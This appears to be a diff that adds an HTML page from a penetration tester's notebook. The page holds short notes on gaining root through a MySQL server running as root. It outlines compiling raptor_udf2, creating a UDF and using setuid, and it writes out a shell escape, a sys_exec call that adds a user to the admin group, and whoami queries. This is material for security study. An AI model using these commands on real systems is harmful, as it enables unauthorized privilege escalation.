@@ -1,0 +1,26 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>MySQL</title>
+</head><body><a href="nbk:///f41cd736-0963-41b7-82df-4b8294c8448f">Link to Attacks &gt; Web &gt; SQLi &gt; MySQL &gt; Local Priv Esc Running as Root</a>&nbsp;<br/>
+<br/>
+Requires MySQL as root<br/>
+Requires gcc (or precompile)<br/>
+<br/>
+TL;DR: <br/>
+Compile raptor_udf2<br/>
+Create function in MySQL<br/>
+Use setuid to give yourself a shell<br/>
+<br/>
+Drop to shell (with potentially different permissions)<br/>
+mysql&gt; \! /bin/sh<br/>
+$<br/>
+<br/>
+If you find that mysql is running as root and you username and password to log in to the database you can issue the following commands:<br/>
+<br/>
+Use a <a href="https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/">User Defined Function</a>/<br/>
+Maybe <a href="https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/">read</a>&nbsp;about the sys_exec() function:<br/>
+sys_exec('usermod -a -G admin username')<br/>
+select sys_exec('whoami');<br/>
+select sys_eval('whoami');</body></html>
